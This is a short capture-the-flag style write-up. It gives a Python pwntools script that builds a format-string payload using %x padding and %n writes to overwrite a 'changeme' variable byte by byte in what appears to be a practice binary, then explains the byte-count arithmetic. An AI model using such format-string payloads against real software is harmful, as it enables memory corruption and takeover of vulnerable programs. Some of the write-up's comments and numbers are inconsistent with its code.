

```python 
from pwn import *

changeme = 0x8049844


zero_chunk = 0x145 - 0x51
second_chunk = 0x178-0x145
third_chunk = 0x245 - 0x178
fourth_chunk = 0x364 - 0x245


buff = ""
buff += p32(changeme+0)
buff += p32(changeme+1)
buff += p32(changeme+2)
buff += p32(changeme+3)

buff += '%x ' * 11      # offset to first byte

buff += 'A' * 244      # JUNK
buff += "%n"            # write to first byte


buff += 'A' * second_chunk     # JUNK
buff += "%n"            # write to first byte


buff += 'A' * third_chunk     # JUNK
buff += "%n"            # write to first byte


buff += 'A' * fourth_chunk      # JUNK
buff += "%n"            # write to first byte


print(buff)
```

in this exploit we are writing a byte at a a time and specifying the address on the beginning. the value %n would commit would be the number
of bytes written until **NOW** -- since we can't go downward we'll always go upward, so we'll always account for how many bytes we have written,
and how much do we need to reach a certain target.

The payload contains 51 bytes and that's just the addresses and `'%x'*11` which account to 0x51 character as noted by the program (address changed to 0x00000051).
to reach `0x145` we need `0x145 - 0x51`, and to get 178 (for 78 as a byte) would be `0x178 - 0x145` and so on
